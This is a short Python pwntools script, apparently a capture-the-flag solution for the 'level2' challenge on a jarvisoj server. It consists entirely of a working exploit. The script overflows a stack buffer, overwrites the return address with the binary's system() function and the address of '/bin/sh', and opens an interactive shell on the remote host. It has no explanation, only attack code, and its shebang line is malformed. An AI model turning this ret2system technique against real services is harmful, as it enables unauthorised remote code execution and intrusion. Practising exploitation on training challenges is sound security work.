#!/bin/bash/envy python
from pwn import *

context.log_level = 'debug'
#sh = process('level2')
sh = remote("pwn2.jarvisoj.com", 9878)
level2 = ELF('level2')
sys_addr = level2.symbols['system']
bin_sh = 0x0804a024
payload = 'a' * 0x88 + 'bbbb' + p32(sys_addr) + "dead" + p32(bin_sh)
sh.recvuntil("Input:\n")
sh.sendline(payload)
sh.interactive()
